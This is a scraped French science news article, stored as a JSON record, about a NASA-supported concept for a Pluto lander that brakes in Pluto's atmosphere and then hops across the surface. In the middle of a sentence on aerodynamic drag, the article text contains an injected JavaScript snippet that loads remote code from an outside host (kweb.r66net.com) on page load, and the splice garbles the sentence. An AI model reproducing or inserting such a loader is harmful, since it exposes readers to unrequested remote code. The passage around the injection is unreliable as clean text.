{"title": "Pluton : un projet d'atterrissage plein de rebondissements étudié par la Nasa", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "16/10/2017", "content": "Le 14 juillet 2015, la sonde New Horizons, de la Nasa, survole Pluton et découvre un monde étonnemment complexe et dynamique. L'envie d'y retourner est immense et les scénarios fleurissent aujourd'hui. Le premier est celui de la firme américaine Global Aerospace, qui propose un atterrisseur capable de faire des bonds ! Ce qu'il faut retenir Le projet de Global Aerospace a reçu un premier soutien de la Nasa. Il consiste à freiner un atterrisseur à l'aide d'un ballon dans l'atmosphère ténue mais étendue de Pluton. L'atterrissage pourrait être suivi d'une progression par bonds, inoffensifs sur cette planète naine à la faible gravité. Lorsqu'en janvier 2006,  New Horizons  quitte la  Terre  à destination de  Pluton , un point minuscule et flou pour les Terriens, les scientifiques ne s'imaginent pas ce que cette sonde de la Nasa va découvrir. En un passage  éclair  à près de 50.000 km/h, New Horizons va montrer un monde étonnamment semblable à une planète avec un  dynamisme insoupçonné  et une surface jeune d'une centaine de millions d'années, sans doute l'une des plus jeunes de notre  Système solaire . Autre particularité, des  montagnes de glace d’eau  et la possibilité de l'existence d'un océan  liquide  sous cette glace. Sans surprise, les astronomes veulent retourner sur Pluton avec une mission autrement plus ambitieuse qu'un  survol . Et si plusieurs scénarios de missions sont à l'étude, l'un d'eux a retenu l'attention de l'Institut des concepts avancés de la Nasa, le NIAC. C'est celui de la firme américaine Global Aerospace qui propose d'envoyer un atterrisseur capable de se déplacer par bonds de plusieurs dizaines, voire quelques centaines de kilomètres. L'idée n'est pas absurde sur un corps où la  gravité  est très faible, quinze fois moins forte que sur Terre. Scénario envisagé pour Pluto Lander. © Global Aerospace corp.                               L'atmosphère ténue de Pluton pour freiner l'atterrisseur Pour poser l'atterrisseur sur Pluton, Global Aerospace étudie un système de décélération et d'atterrissage sur Pluton à partir d'une  vitesse  initiale de plus de 48.000 kilomètres par heure. Lors de la traversée de l' atmosphère  de Pluton, l'atterrisseur sera ralenti non par un  parachute  mais par une  structure gonflable , fournie par ILC Dover, partenaire du projet. L'idée de Global Aerospace est d'utiliser la traînée induite par la très fine l'atmosphère de Pluton au prix de seulement quelques  kilogrammes  de carburant. Un scénario surprenant au premier abord mais qui s'explique par l'étendue de l'atmosphère de Pluton, qui s'étire sur plus de 1.600 km. Sa très faible densité est idéale pour dissiper de grandes quantités d' énergie cinétique  par une traînée aérodynamique,  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Cette technologie pourrait être également utilisée pour la capture en  orbite  et a suscité l'intérêt du NIAC qui a décidé de soutenir les études de faisabilité technique. Si la Nasa décide de financer cette mission, les objectifs scientifiques de l'atterrisseur pourraient être les suivants :  histoire de l'évolution de Pluton et (espoir américain) faire évoluer le statut de Pluton (planète ou  planète naine ) ;  interactions entre le sous-sol et l'atmosphère de la planète en étudiant les  dégazages , par exemple le  cryovolcanisme  supposé ;  élargir la compréhension de la géomorphologie de surface à partir de plusieurs sites distincts (d'ou les bonds de l'atterrisseur) ;  utiliser l' échantillonnage  pour étudier la nature de la  croûte  et rechercher d'hypothétique traces d'eau à l'état liquide ;  valider les mesures de New Horizons, notamment les profils de  pression atmosphérique  et de température. New Horizons : revivez l'approche de Pluton comme si vous y étiez                       Dans cette vidéo composée de plus de cent images prises par la sonde New Horizons au cours des six semaines qui ont précédé le survol historique de Pluton, le 14 juillet 2015, nous pouvons revivre cette approche comme si nous étions à bord. Petit à petit, Pluton et Charon dévoilent leurs surfaces, inconnues jusqu’alors. À la fin de la séquence, on découvre ses reliefs dans la plaine Spoutnik, survolée au plus près, à 12.500 km. Un voyage inoubliable pour les scientifiques et le grand public qui est encore loin d’être achevé.                                       ", "theme": "sciences"}